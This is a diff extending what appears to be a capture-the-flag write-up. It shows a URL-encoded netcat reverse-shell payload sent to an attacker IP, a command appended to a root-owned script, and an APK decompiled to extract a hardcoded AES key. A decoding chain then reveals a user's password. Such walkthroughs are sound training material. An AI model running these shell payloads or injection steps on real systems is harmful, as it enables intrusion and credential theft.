@@ -52,3 +52,30 @@ Though since it had to be in the query string, I first encoded it to url with Bu
     %72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%37%38%2e%37%35%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66
 
 Once on the machine, I tried `sudo -l` and `find / -user root -perm -u=s` without success. I checked out that suspicious entry from the bottom of `/etc/passwd`: `/opt/secret`, and found a file readable and executable by everyone that looked to be (via its first line) a aes/cbc/128 encoded file. I've saved it here as [laxctf.secret](./laxctf.secret).
+
+I spent another huge amount of time (~4 hours) enumerating. I found a apk file under the website, but after running it through strings and decoding it via unzip it didn't seem to contain anything. I also found a script owned by `king` called `cleanpdfdir.sh`, but adding a test `echo "cat /etc/passwd > passwd.txt" >> cleanpdfdir.sh` didn't produce results.
+
+Eventually I gave up, and went for some help. This directed me straight back to the apk, and a tool I was unaware of: apktool: https://ibotpeaches.github.io/Apktool/documentation/
+
+I used this to decode the apk, and while crawling through its files, I found in `smali/com/example/a11x256/frida_test/my_activity.smali` code like the following:
+
+    .prologue
+    .line 90
+    :try_start_0
+    const-string v3, "sUp3rCr3tKEforL!"
+
+    .line 91
+    .local v3, "pre_shared_key":Ljava/lang/String;
+    const-string v1, "sUp3rCr3tIVforL!"
+
+    .line 92
+    .local v1, "generated_iv":Ljava/lang/String;
+    const-string v5, "AES/CBC/128"
+
+Using that via an [online AES decoder](https://www.devglan.com/online-tools/aes-encryption-decryption) I got the following a huge brainfuck script (easily determined via its syntax: `----[---->+<]>--.+[--->+<]>+.[--->+<]>+.[->+++++` etc.). Running that through [a brainfuck interpreter](https://www.dcode.fr/brainfuck-language) gave me what looked a bit like base64. Running *that* through [cyberchef](https://gchq.github.io/CyberChef) didn't decode, however. 
+
+But, one thing I noticed, was that the supposed base64 started with `=`; normally base64, if it has these, adds them at the end as padding. 
+
+A bit of experimenting revealed the solution: reverse -> from base64 * 16 (yes, decode from base64 16 times) which finally gave: 
+
+    king:tryh@ckm3w4sH3r3
